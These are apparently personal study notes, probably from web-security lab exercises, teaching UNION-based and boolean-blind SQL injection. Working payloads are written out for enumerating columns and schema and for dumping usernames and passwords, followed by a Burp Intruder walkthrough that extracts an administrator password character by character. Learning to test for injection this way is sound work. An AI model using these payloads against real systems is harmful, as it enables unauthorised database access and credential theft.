`Step 1 ==>`
To determine no of columns:

Find a parameter, 

`payload:`
```
parameter=something'+UNION+SELECT+NULL--
```

If error occur  increase the no of NULLs until error disappears,

Like this:

```
parameter=something'+UNION+SELECT+NULL,NULL--
```

```
Parameter=something'+UNION+SELECT+NULL, NULL, NULL--
```

`Step 2 ==>`

Enumerate the data types of the columns

Imagine here we found there are 4 columns,

```
Parameter=something'+UNION+SELECT+'abc', NULL,NULL,NULL--
```

This will return error if the column 1 is not a  string, Similarly do for the rest of the following for enumerating data types 

```
Parameter=something'+UNION+SELECT+NULL,'a',NULL,NULL-- 

```


```
Parameter=something'+UNION+SELECT+NULL,NULL,'a',NULL--
```

```
Parameter=something'+UNION+SELECT+NULL,NULL,NULL,'a'--
```

If error messages returns information we get lucky

Example,
`Conversion failed when converting the varchar value 'a' to data type int`

`Step 3 ==>`

Find the table names

`Step 4 ==>`

Create payload using these table name and retrieve results:

example,

To get username and password from a table named `users`, which contains columns as `password`, `username`

```
Parameter=something'+UNION+SELECT+username,+password+FROM+users--
```

`Suppose:`

This sort of commands can be used to return  results together,

Here the password and username string, 

Here the `Null` column is not string  type  as we tested using methods from last steps.

```
Parameter=something'UNION+SELECT+NULL,username || '~' || password+FROM+users--
```

`Step 5 ==>`

This step is finding the database version as it help to use database  specific functions and syntax,

Follow first step to enumerate  column numbers, and data type, 

comment the end of the payload,

Use `--` or `#` for doing this.

Here imagine there are three columns,

```
Parameter=something'+UNION+SELECT+@@version,NULL#
```

`Step 6 ==>`

Using information_schema to retrieve details of database,

First follow older steps to enumerate column no and data type,

Now use information_schema.tables for retrieving table list.

`Payload:`
```
Parameter=something'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

We will get table names 

Use these to retrieve column details,

```
Parameter=something'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='{retrieved table name}'--
```

Now combine table name and column names to retrieve details of database,

```
Parameter=something'+UNION+SELECT+{retrieved column name},{retrieved column name}+FROM+{retrieved table name}--
```


###### BLIND SQL

Here, the difference is that there won't be any details retrieved corresponding to the queries.

But we can observe some changes when the query is true and the query is false.

`Step 1 ==>`

Use payloads that will work and doesn't intentionally to observe changes in the web page in each case.

`Scenario:`

The web app matches cookie value with expected value on server side,  using SQL 

```
Cookie: TrackingId= {tracking id}
```

Using a true sql query ie,

`Payload:`
```
Cookie: TrackingId= {tracking id}' AND '1'='1
```

As 1=1 is true, the query will be parsed to true,

Here in my case i noticed a welcome back message, 
Let's try false condition now,

`Payload:`
```
Cookie: TrackingId= {tracking id}' AND '1'='2
```

As this query is false, the result will be false,

We can now see that the welcome Back message has disappeared.

`Step 2 ==>`

Now  we can try testing for to confirm that a table named users exists (example),

`Payload:`
```
Cookie: TrackingId= {tracking id}' AND (SELECT 'a' FROM users LIMIT 1)='a
```

This returns the welcome back message so we can make sure that the table users exists.

`Step 3 ==>`

Now use this payload to enumerate column names,

`Payload:`
```
Cookie: TrackingId= {tracking id}' AND (SELECT 'a' FROM users WHERE username ='administrator')='a
```


Verify that the condition is true, confirming that there is a user called administrator

`Step 4 ==>`

The next step is to determine how many characters are in the next column name as we completely have no clue of it.

To do this, change the value to:

`Payload:`
```
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

```

We can observe for the welcome back message for to determine wether the length of the column value matches.

`Step 4 ==>`

Now enumerate  the column value,

`Payload:`
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='something')='a
```

This payload will take 1 value from the password and test it against the value after the equals,

Here it will test against 'a' 

Use intruder to find the right alphabet or number.

Go to the Payloads tab, check that "Simple list" is selected, and under **Payload settings** add the payloads in the range a - z and 0 - 9. 

You can select these easily using the "Add from list" drop-down.

- To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the **Settings** tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".

- Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.


- Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.

- Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:


```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

- Launch the modified attack, review the results, and note the character at the second offset.

- Continue this process testing offset 3, 4, and so on, until you have the whole password.



